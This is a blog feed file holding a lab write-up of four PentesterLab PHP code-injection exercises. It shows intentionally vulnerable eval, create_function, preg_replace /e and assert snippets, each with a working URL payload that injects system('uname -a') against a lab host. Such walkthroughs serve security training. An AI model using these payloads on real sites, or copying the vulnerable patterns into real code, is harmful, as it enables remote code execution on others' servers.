@@ -1,0 +1,109 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: code injection | Bob1Bob2]]></title>
+  <link href="http://wg135.github.io/blog/categories/code-injection/atom.xml" rel="self"/>
+  <link href="http://wg135.github.io/"/>
+  <updated>2016-04-27T15:40:42-05:00</updated>
+  <id>http://wg135.github.io/</id>
+  <author>
+    <name><![CDATA[Bob1Bob2]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[Pentestlab--Web for Pentester - Code Injection]]></title>
+    <link href="http://wg135.github.io/blog/2016/03/18/pentestlab-web-for-pentester-code-injection/"/>
+    <updated>2016-03-18T14:37:22-05:00</updated>
+    <id>http://wg135.github.io/blog/2016/03/18/pentestlab-web-for-pentester-code-injection</id>
+    <content type="html"><![CDATA[<p>Web for Pentester: This exercise is a set of the most common web vulnerability</p>
+
+<p>Difficluty: 1/5</p>
+
+<!--more-->
+
+
+<p>Pentester lab:
+ Code executions come from a lack of filtering and/or escaping of user-controlled data. When you are exploiting a code injection, you will need to inject code within the information you are sending to the application. For example, if you want to run the command ls, you will need to send system(&ldquo;ls&rdquo;) to the application since it is a PHP application.</p>
+
+<h3>Example 1</h3>
+
+<p>code review:</p>
+
+<pre><code class="php example1.php">?php 
+  $str="echo \"Hello ".$_GET['name']."!!!\";";
+
+  eval($str);
+?&gt;
+</code></pre>
+
+<p> The developer use function <code>eval</code> to echo the name. Hpwever, the developer doesn&rsquo;t filter the input of eval function. By using concatenation <code>.</code>, I can add code after the input and use <code>#</code> to comment the rest of code</p>
+
+<p> manually exploit:</p>
+
+<p> <code>http://192.168.79.162/codeexec/example1.php?name=hacker".system('uname -a');#</code></p>
+
+<p> payload <code>hacker".system('uname -a');#</code> needs to be URL encoded.</p>
+
+<h3>Example 2</h3>
+
+<p>code review:</p>
+
+<pre><code class="php example2.php">$order = $_GET["order"];
+    $result = mysql_query($sql);
+  if ($result) {
+        while ($row = mysql_fetch_assoc($result)) {
+      $users[] = new User($row['id'],$row['name'],$row['age']);
+    }
+    if (isset($order)) { 
+      usort($users, create_function('$a, $b', 'return strcmp($a-&gt;'.$order.',$b-&gt;'.$order.');'));
+    }
+    }   
+</code></pre>
+
+<p>Form Pentesterlab:</p>
+
+<p>The function usort is often used with the function create_function to dynamically generate the &ldquo;sorting&rdquo; function, based on user-controlled information. If the web application lacks potent filtering and validation, this can lead to code execution.</p>
+
+<p>manually exploit:</p>
+
+<p><code>http://192.168.79.162/codeexec/example2.php?order=id);}system('uname -a');#</code></p>
+
+<h3>Example 3</h3>
+
+<p>code review:</p>
+
+<pre><code class="php example3.php">&lt;?php
+    echo preg_replace($_GET["pattern"], $_GET["new"], $_GET["base"]);
+?&gt;
+</code></pre>
+
+<p>From Pentesterlab:</p>
+
+<p>We talked earlier about regular expression modifiers with multi-line regular expression. Another very dangerous modifier exists in PHP: PCRE_REPLACE_EVAL (/e). This modifier will cause the function preg_replace to evaluate the new value as PHP code, before performing the substitution.</p>
+
+<p>manually exploit:</p>
+
+<p><code>http://192.168.79.162/codeexec/example3.php?new=system('uname%20-a')&amp;pattern=/lamer/e&amp;base=Hello lamer</code></p>
+
+<h3>Example 4</h3>
+
+<p>code review:</p>
+
+<pre><code class="php example4.php">assert(trim("'".$_GET['name']."'"));
+echo "Hello ".htmlentities($_GET['name']);
+</code></pre>
+
+<p>from Pentesterlab:</p>
+
+<p>This example is based on the function assert. When used incorrectly, this function will evaluate the value received. This behaviour can be used to gain code execution.</p>
+
+<p>manual exploit:</p>
+
+<p><code>http://192.168.79.162/codeexec/example4.php?name=hacker'.system('uname -a').'</code></p>
+]]></content>
+  </entry>
+  
+</feed>
